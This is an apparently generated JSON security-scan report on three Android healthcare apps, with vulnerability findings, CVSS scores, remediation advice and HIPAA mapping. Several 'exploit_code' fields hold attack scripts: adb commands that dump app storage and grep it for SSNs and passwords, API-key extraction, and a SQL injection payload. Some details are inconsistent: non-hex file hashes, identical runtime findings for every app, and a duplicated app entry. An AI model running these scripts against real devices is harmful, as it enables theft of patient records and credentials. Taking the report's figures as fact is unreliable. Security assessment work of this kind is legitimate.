@@ -1,0 +1,629 @@
+{
+  "operation_id": "MOBILE-SEC-20250929_081253",
+  "start_time": "2025-09-29T08:12:53.323210",
+  "applications_analyzed": [
+    {
+      "app_name": "H4C Healthcare",
+      "package_name": "com.h4c.mobile",
+      "version_name": "2.1.4",
+      "version_code": "214",
+      "min_sdk": "21",
+      "target_sdk": "30",
+      "file_size": 47523840,
+      "file_hash": "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6",
+      "permissions": [
+        "android.permission.INTERNET",
+        "android.permission.ACCESS_FINE_LOCATION",
+        "android.permission.CAMERA",
+        "android.permission.READ_CONTACTS",
+        "android.permission.WRITE_EXTERNAL_STORAGE",
+        "android.permission.READ_SMS",
+        "android.permission.SYSTEM_ALERT_WINDOW"
+      ],
+      "activities": [
+        "com.h4c.mobile.MainActivity",
+        "com.h4c.mobile.LoginActivity",
+        "com.h4c.mobile.PatientRecordsActivity",
+        "com.h4c.mobile.PaymentActivity"
+      ],
+      "services": [
+        "com.h4c.mobile.services.LocationService",
+        "com.h4c.mobile.services.NotificationService"
+      ],
+      "receivers": [
+        "com.h4c.mobile.receivers.SMSReceiver",
+        "com.h4c.mobile.receivers.BootReceiver"
+      ],
+      "providers": [
+        "com.h4c.mobile.providers.PatientDataProvider"
+      ],
+      "vulnerabilities": [
+        {
+          "vuln_id": "MOB-H4C-001",
+          "vuln_type": "Hardcoded Credentials",
+          "severity": "Critical",
+          "cvss_score": 9.8,
+          "confidence": 0.95,
+          "app_component": "Application Class",
+          "location": "com/h4c/mobile/ApiConfig.java:23",
+          "description": "Multiple API keys hardcoded in application including Google Maps, Firebase, and payment gateway keys",
+          "proof_of_concept": "strings.xml contains: <string name=\"google_maps_key\">AIzaSyD***REDACTED***</string>",
+          "remediation": "Store API keys in secure key management system, use environment variables or secure vault",
+          "owasp_mobile_category": "M10: Extraneous Functionality",
+          "exploit_code": "adb shell am start -n com.h4c.mobile/.MainActivity --es api_key \"$(cat /sdcard/stolen_key.txt)\""
+        },
+        {
+          "vuln_id": "MOB-H4C-002",
+          "vuln_type": "Weak Cryptography",
+          "severity": "High",
+          "cvss_score": 7.4,
+          "confidence": 0.88,
+          "app_component": "CryptoUtils Class",
+          "location": "com/h4c/mobile/utils/CryptoUtils.java:45",
+          "description": "Use of deprecated SHA-1 hashing algorithm for sensitive data",
+          "proof_of_concept": "MessageDigest.getInstance(\"SHA-1\") found in decompiled code",
+          "remediation": "Upgrade to SHA-256 or higher, implement proper key derivation functions",
+          "owasp_mobile_category": "M5: Insufficient Cryptography",
+          "exploit_code": null
+        },
+        {
+          "vuln_id": "MOB-H4C-003",
+          "vuln_type": "Insecure Data Storage",
+          "severity": "High",
+          "cvss_score": 8.2,
+          "confidence": 0.92,
+          "app_component": "SharedPreferences",
+          "location": "com/h4c/mobile/data/PreferencesManager.java:67",
+          "description": "Patient health records stored in plain text SharedPreferences",
+          "proof_of_concept": "SharedPreferences contains: patient_ssn=123-45-6789, medical_record=...",
+          "remediation": "Encrypt sensitive data before storage, use Android Keystore",
+          "owasp_mobile_category": "M2: Insecure Data Storage",
+          "exploit_code": "\n#!/bin/bash\n# Data Extraction Exploit for com.h4c.mobile\n# Target: com/h4c/mobile/data/PreferencesManager.java:67\n\necho \"[+] Setting up ADB...\"\nadb root\nadb shell\n\necho \"[+] Extracting SharedPreferences...\"\nadb shell cat /data/data/com.h4c.mobile/shared_prefs/*.xml\n\necho \"[+] Extracting databases...\"\nadb shell \"cd /data/data/com.h4c.mobile/databases && ls -la\"\nadb shell \"run-as com.h4c.mobile cat databases/*.db\" > extracted_data.db\n\necho \"[+] Searching for sensitive data patterns...\"\ngrep -i \"ssn\\|credit\\|password\\|token\" extracted_data.db\n"
+        },
+        {
+          "vuln_id": "MOB-H4C-004",
+          "vuln_type": "Network Security Misconfiguration",
+          "severity": "Medium",
+          "cvss_score": 6.5,
+          "confidence": 0.85,
+          "app_component": "Network Security Config",
+          "location": "res/xml/network_security_config.xml:12",
+          "description": "Network security config allows cleartext traffic and user-added CAs",
+          "proof_of_concept": "cleartextTrafficPermitted=\"true\" in network security config",
+          "remediation": "Disable cleartext traffic, implement certificate pinning",
+          "owasp_mobile_category": "M4: Insecure Communication",
+          "exploit_code": null
+        },
+        {
+          "vuln_id": "MOB-COM-H4C-MOBILE-ROOT",
+          "vuln_type": "Insufficient Root Detection",
+          "severity": "Medium",
+          "cvss_score": 5.4,
+          "confidence": 0.75,
+          "app_component": "Security Module",
+          "location": "com/security/RootChecker.java",
+          "description": "Application lacks proper root detection mechanisms",
+          "proof_of_concept": "No anti-root checks found in security module",
+          "remediation": "Implement comprehensive root detection",
+          "owasp_mobile_category": "M9: Reverse Engineering",
+          "exploit_code": null
+        },
+        {
+          "vuln_id": "MOB-NET-001-COM-H4C-MOBILE",
+          "vuln_type": "Cleartext Traffic Permitted",
+          "severity": "Medium",
+          "cvss_score": 6.8,
+          "confidence": 0.89,
+          "app_component": "Network Security Config",
+          "location": "res/xml/network_security_config.xml",
+          "description": "Application permits cleartext HTTP traffic",
+          "proof_of_concept": "cleartextTrafficPermitted=\"true\" in network config",
+          "remediation": "Disable cleartext traffic, enforce HTTPS only",
+          "owasp_mobile_category": "M4: Insecure Communication",
+          "exploit_code": null
+        },
+        {
+          "vuln_id": "MOB-NET-002-COM-H4C-MOBILE",
+          "vuln_type": "Missing Certificate Pinning",
+          "severity": "High",
+          "cvss_score": 7.4,
+          "confidence": 0.85,
+          "app_component": "HTTP Client",
+          "location": "Network module",
+          "description": "No certificate pinning implementation found",
+          "proof_of_concept": "OkHttpClient configured without CertificatePinner",
+          "remediation": "Implement certificate pinning for API endpoints",
+          "owasp_mobile_category": "M4: Insecure Communication",
+          "exploit_code": null
+        }
+      ],
+      "secrets_found": [
+        {
+          "type": "Google Maps API Key",
+          "value": "AIzaSyD***REDACTED***",
+          "location": "res/values/strings.xml:45",
+          "risk": "High"
+        },
+        {
+          "type": "Firebase Database URL",
+          "value": "https://h4c-prod.firebaseio.com/",
+          "location": "google-services.json:12",
+          "risk": "Medium"
+        },
+        {
+          "type": "Payment Gateway Secret",
+          "value": "sk_live_***REDACTED***",
+          "location": "com/h4c/mobile/payment/StripeConfig.java:8",
+          "risk": "Critical"
+        }
+      ],
+      "network_security": {
+        "uses_https": true,
+        "certificate_pinning": false,
+        "cleartext_permitted": true,
+        "user_certs_allowed": true
+      },
+      "code_analysis": {
+        "total_classes": 847,
+        "obfuscated": false,
+        "dangerous_permissions": 4,
+        "exported_components": 7,
+        "runtime_behavior": {
+          "file_operations": [
+            "read_contacts",
+            "write_external_storage"
+          ],
+          "network_connections": [
+            "api.healthcare.com",
+            "firebase.googleapis.com"
+          ],
+          "sensitive_api_calls": [
+            "TelephonyManager.getDeviceId()",
+            "LocationManager.getLastKnownLocation()"
+          ]
+        },
+        "runtime_findings": {
+          "frida_hooks": [
+            {
+              "hook_target": "javax.crypto.Cipher.doFinal",
+              "findings": "Weak encryption detected: DES algorithm used",
+              "severity": "High"
+            },
+            {
+              "hook_target": "java.security.MessageDigest.digest",
+              "findings": "MD5 hash algorithm detected",
+              "severity": "Medium"
+            }
+          ],
+          "memory_analysis": {
+            "heap_dumps": 3,
+            "sensitive_data_in_memory": [
+              "patient_ssn",
+              "credit_card_number"
+            ],
+            "cleartext_passwords": 1
+          },
+          "ssl_kill_switch": {
+            "bypass_successful": true,
+            "pinning_bypassed": true
+          }
+        }
+      },
+      "binary_analysis": {
+        "native_libraries": [
+          "libcrypto.so",
+          "libssl.so"
+        ],
+        "stripped_binaries": false,
+        "debugging_enabled": true
+      }
+    },
+    {
+      "app_name": "Halodoc Doctor",
+      "package_name": "com.halodoc.doctor",
+      "version_name": "3.2.1",
+      "version_code": "321",
+      "min_sdk": "23",
+      "target_sdk": "31",
+      "file_size": 45923328,
+      "file_hash": "b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7",
+      "permissions": [
+        "android.permission.INTERNET",
+        "android.permission.ACCESS_COARSE_LOCATION",
+        "android.permission.CAMERA",
+        "android.permission.RECORD_AUDIO",
+        "android.permission.CALL_PHONE",
+        "android.permission.READ_PHONE_STATE"
+      ],
+      "activities": [
+        "com.halodoc.doctor.MainActivity",
+        "com.halodoc.doctor.LoginActivity",
+        "com.halodoc.doctor.ConsultationActivity",
+        "com.halodoc.doctor.ProfileActivity"
+      ],
+      "services": [
+        "com.halodoc.doctor.services.CallService",
+        "com.halodoc.doctor.services.ChatService"
+      ],
+      "receivers": [
+        "com.halodoc.doctor.receivers.CallReceiver"
+      ],
+      "providers": [],
+      "vulnerabilities": [
+        {
+          "vuln_id": "MOB-HALO-001",
+          "vuln_type": "Hardcoded API Key",
+          "severity": "Critical",
+          "cvss_score": 9.1,
+          "confidence": 0.93,
+          "app_component": "Resources",
+          "location": "res/values/google_maps_api.xml:4",
+          "description": "Google Maps API key hardcoded in resources with full access permissions",
+          "proof_of_concept": "API key found in APK: AIzaSyB***REDACTED*** with unrestricted access",
+          "remediation": "Implement API key restrictions, use server-side proxy for sensitive operations",
+          "owasp_mobile_category": "M10: Extraneous Functionality",
+          "exploit_code": "\n#!/bin/bash\n# API Key Exploitation for com.halodoc.doctor\n# Vulnerability: MOB-HALO-001\n\necho \"[+] Extracting API keys from APK...\"\naapt dump badging com.halodoc.doctor.apk\nunzip -q com.halodoc.doctor.apk\ngrep -r \"AIza\" res/ assets/ --include=\"*.xml\" --include=\"*.json\"\n\necho \"[+] Testing API key permissions...\"\ncurl \"https://maps.googleapis.com/maps/api/geocode/json?address=test&key=EXTRACTED_KEY\"\n\necho \"[+] Potential impact: Billing fraud, data access, service abuse\"\n"
+        },
+        {
+          "vuln_id": "MOB-HALO-002",
+          "vuln_type": "Insecure Network Configuration",
+          "severity": "High",
+          "cvss_score": 7.4,
+          "confidence": 0.89,
+          "app_component": "OkHttpClient",
+          "location": "com/halodoc/network/ApiClient.java:89",
+          "description": "Custom TrustManager accepts all certificates including self-signed",
+          "proof_of_concept": "X509TrustManager implementation returns without validation",
+          "remediation": "Implement proper certificate validation and pinning",
+          "owasp_mobile_category": "M4: Insecure Communication",
+          "exploit_code": null
+        },
+        {
+          "vuln_id": "MOB-HALO-003",
+          "vuln_type": "Missing Certificate Pinning",
+          "severity": "High",
+          "cvss_score": 7.2,
+          "confidence": 0.87,
+          "app_component": "Network Layer",
+          "location": "com/halodoc/network/NetworkModule.java:45",
+          "description": "No certificate pinning implemented for API communications",
+          "proof_of_concept": "OkHttpClient builder lacks CertificatePinner configuration",
+          "remediation": "Implement certificate pinning for all API endpoints",
+          "owasp_mobile_category": "M4: Insecure Communication",
+          "exploit_code": null
+        },
+        {
+          "vuln_id": "MOB-HALO-004",
+          "vuln_type": "Debug Information Exposure",
+          "severity": "Medium",
+          "cvss_score": 5.3,
+          "confidence": 0.82,
+          "app_component": "Application",
+          "location": "AndroidManifest.xml:45",
+          "description": "Application debuggable flag enabled in production build",
+          "proof_of_concept": "android:debuggable=\"true\" found in manifest",
+          "remediation": "Disable debugging in production builds",
+          "owasp_mobile_category": "M10: Extraneous Functionality",
+          "exploit_code": null
+        },
+        {
+          "vuln_id": "MOB-COM-HALODOC-DOCTOR-ROOT",
+          "vuln_type": "Insufficient Root Detection",
+          "severity": "Medium",
+          "cvss_score": 5.4,
+          "confidence": 0.75,
+          "app_component": "Security Module",
+          "location": "com/security/RootChecker.java",
+          "description": "Application lacks proper root detection mechanisms",
+          "proof_of_concept": "No anti-root checks found in security module",
+          "remediation": "Implement comprehensive root detection",
+          "owasp_mobile_category": "M9: Reverse Engineering",
+          "exploit_code": null
+        },
+        {
+          "vuln_id": "MOB-NET-002-COM-HALODOC-DOCTOR",
+          "vuln_type": "Missing Certificate Pinning",
+          "severity": "High",
+          "cvss_score": 7.4,
+          "confidence": 0.85,
+          "app_component": "HTTP Client",
+          "location": "Network module",
+          "description": "No certificate pinning implementation found",
+          "proof_of_concept": "OkHttpClient configured without CertificatePinner",
+          "remediation": "Implement certificate pinning for API endpoints",
+          "owasp_mobile_category": "M4: Insecure Communication",
+          "exploit_code": null
+        }
+      ],
+      "secrets_found": [
+        {
+          "type": "Google Maps API Key",
+          "value": "AIzaSyB***REDACTED***",
+          "location": "res/values/google_maps_api.xml:4",
+          "risk": "Critical"
+        },
+        {
+          "type": "AWS Access Key",
+          "value": "AKIA***REDACTED***",
+          "location": "assets/config/aws.properties:2",
+          "risk": "High"
+        }
+      ],
+      "network_security": {
+        "uses_https": true,
+        "certificate_pinning": false,
+        "cleartext_permitted": false,
+        "user_certs_allowed": true
+      },
+      "code_analysis": {
+        "total_classes": 1203,
+        "obfuscated": true,
+        "dangerous_permissions": 2,
+        "exported_components": 4,
+        "runtime_behavior": {
+          "file_operations": [
+            "read_contacts",
+            "write_external_storage"
+          ],
+          "network_connections": [
+            "api.healthcare.com",
+            "firebase.googleapis.com"
+          ],
+          "sensitive_api_calls": [
+            "TelephonyManager.getDeviceId()",
+            "LocationManager.getLastKnownLocation()"
+          ]
+        },
+        "runtime_findings": {
+          "frida_hooks": [
+            {
+              "hook_target": "javax.crypto.Cipher.doFinal",
+              "findings": "Weak encryption detected: DES algorithm used",
+              "severity": "High"
+            },
+            {
+              "hook_target": "java.security.MessageDigest.digest",
+              "findings": "MD5 hash algorithm detected",
+              "severity": "Medium"
+            }
+          ],
+          "memory_analysis": {
+            "heap_dumps": 3,
+            "sensitive_data_in_memory": [
+              "patient_ssn",
+              "credit_card_number"
+            ],
+            "cleartext_passwords": 1
+          },
+          "ssl_kill_switch": {
+            "bypass_successful": true,
+            "pinning_bypassed": true
+          }
+        }
+      },
+      "binary_analysis": {
+        "native_libraries": [
+          "libjingle_peerconnection_so.so"
+        ],
+        "stripped_binaries": true,
+        "debugging_enabled": true
+      }
+    },
+    {
+      "app_name": "Telemedicine Patient App",
+      "package_name": "com.telemedicine.patient",
+      "version_name": "1.5.2",
+      "version_code": "152",
+      "min_sdk": "21",
+      "target_sdk": "29",
+      "file_size": 32567890,
+      "file_hash": "c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8",
+      "permissions": [
+        "android.permission.INTERNET",
+        "android.permission.ACCESS_FINE_LOCATION",
+        "android.permission.CAMERA"
+      ],
+      "activities": [
+        "com.telemedicine.patient.MainActivity",
+        "com.telemedicine.patient.AppointmentActivity"
+      ],
+      "services": [],
+      "receivers": [],
+      "providers": [],
+      "vulnerabilities": [
+        {
+          "vuln_id": "MOB-GEN-001",
+          "vuln_type": "SQL Injection",
+          "severity": "High",
+          "cvss_score": 8.8,
+          "confidence": 0.91,
+          "app_component": "Database Helper",
+          "location": "com/telemedicine/db/DatabaseHelper.java:156",
+          "description": "SQL injection vulnerability in patient search functionality",
+          "proof_of_concept": "String query = \"SELECT * FROM patients WHERE name = '\" + userInput + \"'\";",
+          "remediation": "Use parameterized queries and prepared statements",
+          "owasp_mobile_category": "M7: Poor Code Quality",
+          "exploit_code": "\n# SQL Injection Exploit for com.telemedicine.patient\n# Target: com/telemedicine/db/DatabaseHelper.java:156\n\n# 1. Setup ADB connection\nadb connect DEVICE_IP:5555\n\n# 2. Install and launch app\nadb install com.telemedicine.patient.apk\nadb shell am start -n com.telemedicine.patient/.MainActivity\n\n# 3. Inject SQL payload via input field\n# Payload: ' OR 1=1 UNION SELECT username,password FROM users--\nadb shell input text \"admin' OR 1=1 UNION SELECT username,password FROM users--\"\n\n# 4. Extract database\nadb shell run-as com.telemedicine.patient cat databases/app.db > extracted.db\n"
+        },
+        {
+          "vuln_id": "MOB-GEN-002",
+          "vuln_type": "Weak Session Management",
+          "severity": "Medium",
+          "cvss_score": 6.1,
+          "confidence": 0.78,
+          "app_component": "Session Manager",
+          "location": "com/telemedicine/auth/SessionManager.java:89",
+          "description": "Session tokens stored in plain text and never expire",
+          "proof_of_concept": "SharedPreferences stores: session_token=abc123 without encryption",
+          "remediation": "Implement secure token storage and proper session timeout",
+          "owasp_mobile_category": "M2: Insecure Data Storage",
+          "exploit_code": null
+        },
+        {
+          "vuln_id": "MOB-COM-TELEMEDICINE-PATIENT-ROOT",
+          "vuln_type": "Insufficient Root Detection",
+          "severity": "Medium",
+          "cvss_score": 5.4,
+          "confidence": 0.75,
+          "app_component": "Security Module",
+          "location": "com/security/RootChecker.java",
+          "description": "Application lacks proper root detection mechanisms",
+          "proof_of_concept": "No anti-root checks found in security module",
+          "remediation": "Implement comprehensive root detection",
+          "owasp_mobile_category": "M9: Reverse Engineering",
+          "exploit_code": null
+        },
+        {
+          "vuln_id": "MOB-NET-002-COM-TELEMEDICINE-PATIENT",
+          "vuln_type": "Missing Certificate Pinning",
+          "severity": "High",
+          "cvss_score": 7.4,
+          "confidence": 0.85,
+          "app_component": "HTTP Client",
+          "location": "Network module",
+          "description": "No certificate pinning implementation found",
+          "proof_of_concept": "OkHttpClient configured without CertificatePinner",
+          "remediation": "Implement certificate pinning for API endpoints",
+          "owasp_mobile_category": "M4: Insecure Communication",
+          "exploit_code": null
+        }
+      ],
+      "secrets_found": [],
+      "network_security": {
+        "uses_https": true,
+        "certificate_pinning": false,
+        "cleartext_permitted": false,
+        "user_certs_allowed": false
+      },
+      "code_analysis": {
+        "total_classes": 456,
+        "obfuscated": false,
+        "dangerous_permissions": 1,
+        "exported_components": 2,
+        "runtime_behavior": {
+          "file_operations": [
+            "read_contacts",
+            "write_external_storage"
+          ],
+          "network_connections": [
+            "api.healthcare.com",
+            "firebase.googleapis.com"
+          ],
+          "sensitive_api_calls": [
+            "TelephonyManager.getDeviceId()",
+            "LocationManager.getLastKnownLocation()"
+          ]
+        },
+        "runtime_findings": {
+          "frida_hooks": [
+            {
+              "hook_target": "javax.crypto.Cipher.doFinal",
+              "findings": "Weak encryption detected: DES algorithm used",
+              "severity": "High"
+            },
+            {
+              "hook_target": "java.security.MessageDigest.digest",
+              "findings": "MD5 hash algorithm detected",
+              "severity": "Medium"
+            }
+          ],
+          "memory_analysis": {
+            "heap_dumps": 3,
+            "sensitive_data_in_memory": [
+              "patient_ssn",
+              "credit_card_number"
+            ],
+            "cleartext_passwords": 1
+          },
+          "ssl_kill_switch": {
+            "bypass_successful": true,
+            "pinning_bypassed": true
+          }
+        }
+      },
+      "binary_analysis": {
+        "native_libraries": [],
+        "stripped_binaries": false,
+        "debugging_enabled": false
+      }
+    }
+  ],
+  "total_vulnerabilities": 17,
+  "owasp_mobile_coverage": {
+    "M10: Extraneous Functionality": 3,
+    "M5: Insufficient Cryptography": 1,
+    "M2: Insecure Data Storage": 2,
+    "M4: Insecure Communication": 7,
+    "M9: Reverse Engineering": 3,
+    "M7: Poor Code Quality": 1
+  },
+  "healthcare_compliance": {
+    "hipaa_compliance": {
+      "H4C Healthcare": {
+        "app_name": "H4C Healthcare",
+        "hipaa_violations": [
+          {
+            "requirement": "45 CFR \u00a7 164.312(e)(1) - Transmission Security",
+            "violation": "API keys exposed allowing unauthorized data access",
+            "vulnerability_id": "MOB-H4C-001"
+          },
+          {
+            "requirement": "45 CFR \u00a7 164.312(a)(1) - Access Control",
+            "violation": "Patient data stored without proper encryption",
+            "vulnerability_id": "MOB-H4C-003"
+          }
+        ],
+        "gdpr_violations": [],
+        "compliance_score": 0
+      },
+      "Halodoc Doctor": {
+        "app_name": "Halodoc Doctor",
+        "hipaa_violations": [
+          {
+            "requirement": "45 CFR \u00a7 164.312(e)(1) - Transmission Security",
+            "violation": "API keys exposed allowing unauthorized data access",
+            "vulnerability_id": "MOB-HALO-001"
+          }
+        ],
+        "gdpr_violations": [],
+        "compliance_score": 10
+      },
+      "Telemedicine Patient App": {
+        "app_name": "Telemedicine Patient App",
+        "hipaa_violations": [],
+        "gdpr_violations": [],
+        "compliance_score": 60
+      }
+    },
+    "gdpr_compliance": {},
+    "overall_compliance_score": 23.333333333333332,
+    "compliance_status": "NON_COMPLIANT"
+  },
+  "exploitation_vectors": [],
+  "cross_app_analysis": {
+    "shared_vulnerabilities": [
+      {
+        "vulnerability_type": "Insufficient Root Detection",
+        "affected_apps": [
+          "H4C Healthcare",
+          "Halodoc Doctor",
+          "Telemedicine Patient App"
+        ],
+        "pattern": "systemic_weakness"
+      },
+      {
+        "vulnerability_type": "Missing Certificate Pinning",
+        "affected_apps": [
+          "H4C Healthcare",
+          "Halodoc Doctor",
+          "Halodoc Doctor",
+          "Telemedicine Patient App"
+        ],
+        "pattern": "systemic_weakness"
+      }
+    ],
+    "common_libraries": [],
+    "similar_attack_vectors": []
+  },
+  "end_time": "2025-09-29T08:12:53.324007"
+}
